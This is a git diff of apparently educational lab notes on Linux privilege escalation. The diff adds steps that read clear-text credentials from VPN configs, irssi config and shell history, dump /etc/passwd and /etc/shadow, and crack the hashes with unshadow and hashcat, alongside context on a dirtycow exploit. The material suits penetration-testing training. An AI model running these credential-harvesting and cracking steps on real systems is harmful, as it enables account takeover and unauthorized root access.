@@ -16,7 +16,7 @@ In command prompt type:&#x20;
 
 From the output, notice that the OS is vulnerable to “dirtycow”.
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -56,7 +56,7 @@ In command prompt type:&#x20;
 id
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
 
@@ -69,5 +69,80 @@ cp /tmp/bak /usr/bin/passwd
 ls -lah /usr/bin/passwd 
 ```
 
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - Stored Passwords (Config Files)
+
+From the output, make note of the value of the “auth-user-pass” directive.&#x20;
+
+**Victim**
+
+```
+cat /home/user/myvpn.ovpn
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+From the output, make note of the clear-text credentials.&#x20;
+
+**Victim**
+
+```
+cat /etc/openvpn/auth.txt 
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+From the output, make note of the clear-text credentials.
+
+**Victim**
+
+```
+cat /home/user/.irssi/config | grep -i passw 
+```
+
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - Stored Passwords (History)
+
+**Victim**
+
+```
+cat ~/.bash_history | grep -i passw 
+```
+
+From the output, make note of the clear-text credentials.
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - Weak File Permissions
+
+**Victim**
+
+```
+cat /etc/passwd
+```
+
+Save the output to a file on your attacker machine
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cat /etc/shadow
+```
+
+Save the output to a file on your attacker machine
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+unshadow passwd shadow > unshadowed.txt
+hashcat -m 1800 unshadowed.txt rockyou.txt -O
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
